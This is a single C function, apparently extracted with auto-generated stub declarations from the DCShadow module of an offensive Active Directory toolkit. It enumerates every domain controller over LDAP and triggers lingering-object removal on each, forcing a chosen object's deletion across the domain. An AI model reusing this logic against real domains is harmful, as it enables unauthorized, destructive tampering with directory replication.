
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_3__ {char* szConfigurationNamingContext; int ld; int szDCDsServiceName; int szDCFQDN; } ;
typedef char* PWSTR ;
typedef int * PLDAPMessage ;
typedef TYPE_1__* PDCSHADOW_DOMAIN_INFO ;
typedef scalar_t__ NTSTATUS ;
typedef int LDAP ;
typedef scalar_t__ DWORD ;


 int FALSE ;
 int LDAP_SCOPE_BASE ;
 int LDAP_SCOPE_SUBTREE ;
 scalar_t__ LDAP_SUCCESS ;
 int LocalFree (char*) ;
 int PRINT_ERROR (char*,scalar_t__,scalar_t__,...) ;
 scalar_t__ _wcsicmp (char*,int ) ;
 int kprintf (char*,char*) ;
 char* kuhl_m_lsadump_dcshadow_getSingleTextAttr (int ,int *,char*) ;
 scalar_t__ kuhl_m_lsadump_dcshadow_init_ldap (char*,int **) ;
 scalar_t__ kuhl_m_lsadump_dcshadow_lingering_trigger (int *,int ,char*) ;
 char* ldap_get_dn (int ,int *) ;
 int ldap_msgfree (int *) ;
 int * ldap_next_entry (int ,int *) ;
 scalar_t__ ldap_search_s (int ,char*,int ,char*,char**,int ,int **) ;
 int ldap_unbind (int *) ;
 char* wcsstr (char*,char*) ;

NTSTATUS kuhl_m_lsadump_dcshadow_lingering_propagate(PDCSHADOW_DOMAIN_INFO info, PWSTR szObjectToKill)
{
 DWORD dwErr;
 PLDAPMessage pMessage = ((void*)0), pEntry, pServerMessage;
 PWSTR szNTDSADn;
 PWSTR szServerDN, szServerFQDN;
 LDAP* ld;
 PWSTR szAttributes[] = {L"dNSHostName", ((void*)0)};
 dwErr = ldap_search_s(info->ld, info->szConfigurationNamingContext, LDAP_SCOPE_SUBTREE, L"(objectClass=nTDSDSA)", ((void*)0), FALSE, &pMessage);
 if(dwErr == LDAP_SUCCESS)
 {
  pEntry = pMessage;
  while(pEntry != ((void*)0))
  {
   szNTDSADn = ldap_get_dn(info->ld, pEntry);
   szServerDN = wcsstr(szNTDSADn, L",CN=") + 1;
   dwErr = ldap_search_s(info->ld, szServerDN, LDAP_SCOPE_BASE, ((void*)0), szAttributes, FALSE, &pServerMessage);
   if(dwErr == LDAP_SUCCESS)
   {
    szServerFQDN = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pServerMessage, szAttributes[0]);
    if (szServerFQDN && _wcsicmp(szServerFQDN, info->szDCFQDN) != 0)
    {
     kprintf(L"  * %s\n", szServerFQDN);
     if (!(dwErr = kuhl_m_lsadump_dcshadow_init_ldap(szServerFQDN, &ld)))
     {
      dwErr = kuhl_m_lsadump_dcshadow_lingering_trigger(ld, info->szDCDsServiceName, szObjectToKill);
      if (dwErr)
       PRINT_ERROR(L"trigger lingering for %s 0x%x (%u)\n", szServerFQDN, dwErr, dwErr);
      ldap_unbind(ld);
     }
     else PRINT_ERROR(L"ldap_connect 0x%x (%u)\n", dwErr, dwErr);
     LocalFree(szServerFQDN);
    }
    ldap_msgfree(pServerMessage);
   }

   pEntry = ldap_next_entry(info->ld, pEntry);
  }
  ldap_msgfree(pMessage);
 }
 return dwErr;
}
